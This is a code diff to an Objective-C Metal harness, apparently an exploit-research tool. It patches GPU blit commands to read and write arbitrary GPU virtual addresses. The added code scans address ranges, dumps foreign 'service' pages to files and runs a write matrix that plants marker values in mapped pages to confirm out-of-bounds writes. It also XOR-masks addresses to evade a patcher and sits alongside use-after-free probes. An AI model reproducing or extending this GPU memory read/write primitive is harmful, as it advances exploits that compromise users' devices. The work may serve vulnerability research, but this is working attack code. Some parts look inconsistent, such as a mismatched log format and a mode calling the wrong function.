@@ -14737,6 +14737,9 @@ static void p_gpuvmscan(void) {
     uint64_t gpuA = [bufA gpuAddress];
     uint64_t gpuB = [bufB gpuAddress];
     LOG("[gscan] gpuA 0x%llx gpuB 0x%llx", gpuA, gpuB);
+    int v91 = getenv("FUZZ_GPUVMSCAN2") != NULL;
+    NSString *dumpdir = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/gpuvm-dump"];
+    if (v91) [[NSFileManager defaultManager] createDirectoryAtPath:dumpdir withIntermediateDirectories:YES attributes:nil error:nil];
 
     static uint64_t hits[24];
     static int nhit;
@@ -14770,6 +14773,10 @@ static void p_gpuvmscan(void) {
         if (data) {
             mtl_hexdump("DATA", x, bb, 0x40);
             if (nhit < 24) hits[nhit++] = x;
+            if (v91) {
+                NSString *fn = [NSString stringWithFormat:@"%@/page_%llx.bin", dumpdir, x];
+                [[NSData dataWithBytes:bb length:0x10000] writeToFile:fn atomically:NO];
+            }
         }
         return data;
     };
@@ -14799,11 +14806,22 @@ static void p_gpuvmscan(void) {
         }
         // this cb is never committed; fine (encode only)
     }
-    if (sp) {
+    if (v91 && !getenv("FUZZ_SCAN_WRITEONLY")) {
+        // phase A: page dumps of the service regions
+        for (uint64_t x = 0x10000c000ULL; x < 0x100044000ULL; x += 0x4000)
+            probe(x, "A-dump");
+        for (uint64_t x = 0x1000000000ULL; x < 0x100000c000ULL; x += 0x4000)
+            probe(x, "A-dump-0x10");
+        // phase B: extended scan
+        for (uint64_t x = 0x100044000ULL; x < 0x100100000ULL; x += 0x4000)
+            probe(x, "B-ext");
+    } else if (sp) {
         // dense single-space scan: 0x400000 bytes, 0x4000 step
         uint64_t base = strtoull(sp, NULL, 0) << 32;
         for (uint64_t off = 0; off < 0x400000; off += 0x4000)
             probe(base + off, "space-dense");
+    } else if (getenv("FUZZ_SCAN_WRITEONLY")) {
+        // skip read phases entirely — write matrix only
     } else {
         // 3. low 0x1-space
         for (uint64_t a = 0x10000000000ULL; a < 0x10000100000ULL; a += 0x4000)
@@ -14823,10 +14841,23 @@ static void p_gpuvmscan(void) {
     LOG("[gscan] scan done: %ld probes, %d data hits", pidx - skip, nhit);
 
     // 7. write-probes on the most interesting hits: marker -> X, then read X back
-    for (int h = 0; h < nhit && h < 8; h++) {
-        uint64_t x = hits[h];
+    // write-probe targets: collected hits + (v91) hardcoded known-mapped pages
+    static const uint64_t wt_static[] = {
+        0x10000c000ULL, 0x100010000ULL, 0x10001c000ULL, 0x100020000ULL,
+        0x100034000ULL, 0x100040000ULL, 0x100110000ULL, 0x100120000ULL,
+        0x1000000000ULL, 0x1000004000ULL,
+    };
+    uint64_t wt[40]; int nwt = 0;
+    int wcap = v91 ? 24 : 8;
+    for (int i = 0; i < nhit && i < wcap; i++) wt[nwt++] = hits[i];
+    if (v91) for (unsigned i = 0; i < sizeof(wt_static)/sizeof(wt_static[0]); i++) wt[nwt++] = wt_static[i];
+    uint64_t wskip = sk ? strtoull(sk, NULL, 0) : 0;
+    for (int h = 0; h < nwt; h++) {
+        uint64_t x = wt[h];
+        if (v91 && wskip > 0xffff && x < wskip) continue;   // hex addr resume
+        uint64_t marker = 0xdeadbeef00000000ULL | (x & 0xffffffffULL);
         uint64_t *ap = (uint64_t *)[bufA contents];
-        for (int i = 0; i < 0x10000 / 8; i++) ap[i] = 0xdeadbeefcafe0000ULL | (uint64_t)h;
+        for (int i = 0; i < 0x10000 / 8; i++) ap[i] = marker;
         id<MTLCommandBuffer> cb = [mq commandBuffer];
         id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
         [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
@@ -14856,12 +14887,137 @@ static void p_gpuvmscan(void) {
             continue;
         }
         uint64_t *bp = (uint64_t *)[bufB contents];
-        int marker = 0;
-        for (int i = 0; i < 0x10000 / 8; i++) if ((bp[i] & 0xffffffffff00ULL) == (0xdeadbeefcafe0000ULL | (uint64_t)h)) marker++;
-        LOG("[gscan] write-probe X 0x%llx -> readback marker qwords %d/8192 %s",
-            x, marker, marker > 4000 ? "*** WRITE-PROBE CONFIRMED ***" : "(no)");
+        int nmark = 0;
+        for (int i = 0; i < 0x10000 / 8; i++) if (bp[i] == marker) nmark++;
+        LOG("[gscan] write-probe X 0x%llx -> %s (marker qwords %d/8192)",
+            x, nmark > 4000 ? "WROTE ***" : "DROPPED", nmark);
     }
     LOG("[gscan] done (alive)");
+}
+
+// V91: page-granular dumps of the service GPU pages, write matrix, extended
+// scan. Copy size 0x4000 (one page per probe). Pages saved to
+// Documents/gpuvm-dump/page_<gpuva>.bin. Ops are numbered; FUZZ_SCAN_SKIP
+// resumes after a fatal probe.
+static uint64_t g_srcx, g_dstx;   // gpuA/gpuB xor-masked (the slot patcher
+                                  // rewrites any in-VM copy of the raw value)
+static long gscan2_one(id<MTLCommandQueue> mq, id<MTLBuffer> bufA, id<MTLBuffer> bufB,
+                       uint64_t x, int wr) {
+    uint64_t gpuA = g_srcx ^ 0x5a5a5a5a5a5a5a5aULL;
+    uint64_t gpuB = g_dstx ^ 0x5a5a5a5a5a5a5a5aULL;
+    id<MTLCommandBuffer> cb = [mq commandBuffer];
+    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+    [enc endEncoding];
+    long np = gscan_patch(wr ? gpuB : gpuA, x);
+    if (!wr) memset([bufB contents], 0, 0x10000);
+    @try {
+        [cb commit];
+        [cb waitUntilCompleted];
+    } @catch (NSException *ex) {
+        return -1;
+    }
+    return np;
+}
+
+static void p_gpuvmscan2(void) {
+    LOG("[gscan2] v91: page dumps + write matrix + extended scan");
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) return;
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    if (!mq || !bufA || !bufB) return;
+    memset([bufA contents], 0x41, 0x10000);
+    memset([bufB contents], 0, 0x10000);
+    uint64_t gpuA = [bufA gpuAddress];
+    uint64_t gpuB = [bufB gpuAddress];
+    g_srcx = gpuA ^ 0x5a5a5a5a5a5a5a5aULL;
+    g_dstx = gpuB ^ 0x5a5a5a5a5a5a5a5aULL;
+    NSString *dir = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/gpuvm-dump"];
+    [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
+    const char *sk = getenv("FUZZ_SCAN_SKIP");
+    long skip = sk ? atol(sk) : 0;
+    long op = 0;
+    uint8_t *bb = (uint8_t *)[bufB contents];
+    static uint64_t mapped[128];
+    int nmapped = 0;
+    // op #1: calib self-probe (from==to==gpuA) — builds the slot-region cache
+    // WITHOUT corrupting Metal's bookkeeping (v91 lesson: a full-scan patch to a
+    // foreign address rewrites bufA's stored gpuAddress and blinds later probes).
+    {
+        op++;
+        if (op > skip) {
+            long np = gscan2_one(mq, bufA, bufB, gpuA, 0);
+            long a41 = 0;
+            for (long i = 0; i < 0x10000; i++) if (bb[i] == 0x41) a41++;
+            LOG("[gscan2] calib-self: slots %ld B 0x41 %ld/0x10000 %s", op, np, a41,
+                a41 > 0x8000 ? "OK" : "BROKEN");
+        }
+    }
+
+    // ---- phase A: page dumps 0x1_0000c000..0x1_00044000, 0x10_00000000..0x10_0000c000
+    static const struct { uint64_t base, end; } dumpRanges[] = {
+        { 0x10000c000ULL, 0x100044000ULL },
+        { 0x1000000000ULL, 0x100000c000ULL },
+    };
+    for (unsigned ri = 0; ri < sizeof(dumpRanges)/sizeof(dumpRanges[0]); ri++) {
+        for (uint64_t x = dumpRanges[ri].base; x < dumpRanges[ri].end; x += 0x4000) {
+            op++;
+            if (op <= skip) continue;
+            long np = gscan2_one(mq, bufA, bufB, x, 0);
+            long nz = 0;
+            for (long i = 0; i < 0x10000; i++) if (bb[i]) nz++;
+            LOG("[gscan2] A#%ld page 0x%llx -> slots %ld nz %ld %s", op, x, np, nz, nz ? "MAPPED" : "");
+            if (np > 0 && nz > 0) {
+                NSString *fn = [NSString stringWithFormat:@"%@/page_%llx.bin", dir, x];
+                NSData *d = [NSData dataWithBytes:bb length:0x10000];
+                [d writeToFile:fn atomically:NO];
+                if (nmapped < 128) mapped[nmapped++] = x;
+            }
+        }
+    }
+    // ---- phase B: extended read scan 0x1_00044000..0x1_00100000
+    for (uint64_t x = 0x100044000ULL; x < 0x100100000ULL; x += 0x4000) {
+        op++;
+        if (op <= skip) continue;
+        long np = gscan2_one(mq, bufA, bufB, x, 0);
+        long nz = 0;
+        for (long i = 0; i < 0x10000; i++) if (bb[i]) nz++;
+        if (np > 0 && nz > 0) {
+            LOG("[gscan2] B#%ld page 0x%llx -> nz %ld MAPPED", op, x, nz);
+            mtl_hexdump("B-DATA", x, bb, 0x40);
+            NSString *fn = [NSString stringWithFormat:@"%@/page_%llx.bin", dir, x];
+            [[NSData dataWithBytes:bb length:0x10000] writeToFile:fn atomically:NO];
+            if (nmapped < 128) mapped[nmapped++] = x;
+        } else if ((op & 0x1f) == 0) {
+            LOG("[gscan2] B#%ld alive (x 0x%llx)", op, x);
+        }
+    }
+    LOG("[gscan2] read phases done: %ld ops, %d mapped pages", op, nmapped);
+
+    // ---- phase C: write matrix over mapped pages
+    for (int h = 0; h < nmapped; h++) {
+        uint64_t x = mapped[h];
+        op++;
+        if (op <= skip) continue;
+        uint64_t marker = 0xdeadbeef00000000ULL | (x & 0xffffffffULL);
+        uint64_t *ap = (uint64_t *)[bufA contents];
+        for (int i = 0; i < 0x10000 / 8; i++) ap[i] = marker;
+        LOG("[gscan2] C#%ld write-probe 0x%llx...", op, x);
+        long np = gscan2_one(mq, bufA, bufB, x, 1);
+        if (np < 0) { LOG("[gscan2] C#%ld 0x%llx commit exception", op, x); continue; }
+        // read back
+        long np2 = gscan2_one(mq, bufA, bufB, x, 0);
+        (void)np2;
+        long nm = 0;
+        uint64_t *bp = (uint64_t *)bb;
+        for (int i = 0; i < 0x10000 / 8; i++) if (bp[i] == marker) nm++;
+        LOG("[gscan2] C#%ld page 0x%llx -> %s (marker qwords %ld/2048, slots %ld)",
+            op, x, nm > 4096 ? "WROTE" : "DROPPED", nm, np);
+        memset(ap, 0x41, 0x10000);   // restore A for further reads
+    }
+    LOG("[gscan2] done (alive), total ops %ld", op);
 }
 
 static void p4b_uaf2(void) {
@@ -14994,6 +15150,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_GPUVMSCAN2")) { p_gpuvmscan(); LOG("[probe13] gpuvmscan2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUVMSCAN")) { p_gpuvmscan(); LOG("[probe13] gpuvmscan-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTPATCH")) { p_mtpatch(); LOG("[probe13] mtpatch-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLTRACE")) { p_mtltrace(); LOG("[probe13] mtltrace-only mode, stop"); return NULL; }
